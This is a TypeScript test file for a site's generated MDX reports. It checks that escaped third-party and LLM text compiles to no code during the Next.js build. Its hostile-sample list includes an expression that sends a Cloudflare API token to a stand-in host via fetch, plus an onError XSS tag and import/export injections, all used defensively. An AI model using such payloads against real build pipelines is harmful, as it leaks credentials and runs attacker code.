// @vitest-environment node
/**
 * Generated report MDX must contain no JSX and no `{…}` expressions.
 *
 * `scripts/generate-reports.ts` writes third-party text (Limitless event and player names,
 * Smogon names) and LLM output into these files, and the report pages are prerendered, so an
 * expression would run during `next build`. The generator escapes that text
 * (`scripts/lib/mdx-escape.ts`); this test is the backstop. It runs in the "Build Teambuilder"
 * check, including on the monthly report PR, so an unescaped value fails before merge.
 *
 * Hand-written reports (no `generated: true` in the manifest) may use components and are
 * not checked.
 */
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { createProcessor } from "@mdx-js/mdx";
import remarkGfm from "remark-gfm";
import { describe, expect, it } from "vitest";
import { escapeMdxInline } from "../../../../scripts/lib/mdx-escape";

const REPORTS_DIR = join(__dirname, "../content/reports");
const CODE_NODE_TYPES = new Set([
    "mdxjsEsm",
    "mdxFlowExpression",
    "mdxTextExpression",
    "mdxJsxFlowElement",
    "mdxJsxTextElement",
]);

interface Node {
    type: string;
    children?: Node[];
    position?: { start: { line: number } };
}

const processor = createProcessor({ remarkPlugins: [remarkGfm] });

/** Every node in the MDX that would compile to code, as `type@line`. */
function codeNodes(mdx: string): string[] {
    const found: string[] = [];
    const walk = (node: Node) => {
        if (CODE_NODE_TYPES.has(node.type)) {
            found.push(`${node.type}@${node.position?.start.line ?? "?"}`);
        }
        for (const child of node.children ?? []) walk(child);
    };
    walk(processor.parse(mdx) as unknown as Node);
    return found;
}

function tableCells(mdx: string): number[] {
    const counts: number[] = [];
    const walk = (node: Node) => {
        if (node.type === "tableRow") counts.push(node.children?.length ?? 0);
        for (const child of node.children ?? []) walk(child);
    };
    walk(processor.parse(mdx) as unknown as Node);
    return counts;
}

const manifest: { slug: string; month: string; generated?: boolean }[] = JSON.parse(
    readFileSync(join(REPORTS_DIR, "manifest.json"), "utf-8"),
);
const generated = manifest.filter((entry) => entry.generated);

describe("generated report MDX", () => {
    it("has generated reports to check", () => {
        expect(generated.length).toBeGreaterThan(0);
    });

    it.each(generated.map((e) => [`${e.slug}/${e.month}`, e] as const))(
        "%s contains no JSX or expressions",
        (_name, entry) => {
            const mdx = readFileSync(join(REPORTS_DIR, entry.slug, `${entry.month}.mdx`), "utf-8");
            expect(codeNodes(mdx)).toEqual([]);
        },
    );
});

describe("escapeMdxInline against the real MDX parser", () => {
    const hostile = [
        '{(fetch("https://x.example/"+process.env.CLOUDFLARE_API_TOKEN),"")}',
        "<img src=x onError={alert(1)} />",
        "<Foo />",
        "import x from 'y'",
        "Cup\n\nexport const a = 1",
    ];

    it("the detector catches raw hostile text", () => {
        expect(codeNodes(`### ${hostile[0]}`).length).toBeGreaterThan(0);
        expect(
            codeNodes('| a |\n|---|\n| <img src="x" onError={alert(1)} /> |').length,
        ).toBeGreaterThan(0);
        // Invalid JSX doesn't parse at all, which fails the build (and this test) too.
        expect(() => codeNodes(`### ${hostile[1]}`)).toThrow();
    });

    it.each(hostile)("escaped text compiles to no code in a heading or table cell: %s", (text) => {
        const safe = escapeMdxInline(text);
        expect(codeNodes(`### ${safe} — 1 Jan, 64 players`)).toEqual([]);
        expect(codeNodes(`| Player | Team |\n|---|---|\n| ${safe} | x |`)).toEqual([]);
    });

    it("keeps a name containing | in one table cell", () => {
        const row = `| Place | Player |\n|---|---|\n| 1 | ${escapeMdxInline("NMR | Tom Baldwin")} |`;
        expect(tableCells(row)).toEqual([2, 2]);
    });
});
